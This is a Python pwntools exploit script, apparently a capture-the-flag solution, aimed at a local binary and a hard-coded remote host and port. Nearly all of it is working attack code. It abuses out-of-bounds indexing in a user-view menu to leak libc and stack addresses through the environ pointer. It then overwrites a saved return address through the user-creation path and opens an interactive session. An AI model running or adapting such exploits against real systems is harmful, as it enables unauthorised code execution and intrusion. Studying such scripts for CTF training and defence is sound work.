#!/usr/bin/python3

from pwn import *

exe = ELF('./test', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x00000000004013a3
        b* 0x4014f9
        b* 0x0000000004013A2
                   
        c
        ''')
        sleep(1)
# b* 0x000000000040145e
while(1):
    if args.REMOTE:
        p = remote('67.223.119.69',5028)
    else:
        p = process([exe.path])
   

    sla(b'create a user.',b'lam')

    # start_offset_search = 0x00007ff000000000
    # users = 0x4036a0
    # id_start = 1758359558379

    sla(b'Input your choice:',b'2')
    slna(b'Input id to view:',-2)
    p.recvuntil(b'Name: ',drop=True)
    leak_libc = u64(p.recvuntil(b'\n',drop = True) + b'\0\0')
    info(hex(leak_libc))
    libc_base = leak_libc - 0x606f0
    info("libc_base " + hex(libc_base))   
    environ = libc_base + 0x222200
    info("environ offset " + hex(environ))   

    id_environ = (environ - 0x4036a0)//80


    byte_need_to_add = environ - (id_environ *80) - 0x4036a0
    info(byte_need_to_add)
    if(byte_need_to_add):
        p.close()   
        continue

        
    sla(b'Input your choice:',b'2')

    slna(b'Input id to view:',id_environ)
    p.recvuntil(b'Name: ',drop=True)
    leak_stack = u64(p.recvuntil(b'\n',drop = True) + b'\0\0')
    info("leak_stack: "+hex(leak_stack))

    ret_offset = leak_stack -0x150
    id_ret = (ret_offset - 0x4036a0)//80
    byte_need_to_add = ret_offset - (id_ret *80) - 0x4036a0
    info("                                  "+ str(byte_need_to_add))
    if(byte_need_to_add > 8):
        p.close()   
        continue
    #GDB()
    sla(b'Input your choice:',b'1')
    slna(b"Input user 's id:",id_ret)
    payload = b''
    payload = payload.ljust(byte_need_to_add,b'a')
    payload += p64(0x4012d6 + 5)
    sla(b"Input user 's name:",payload)


        





    p.interactive()
    # 0x150
    # leak_libc
    # leak_environ

    # p/d x - ((0x4036a0 - x )/80 *80)

    #environ = libc_base + 0x222200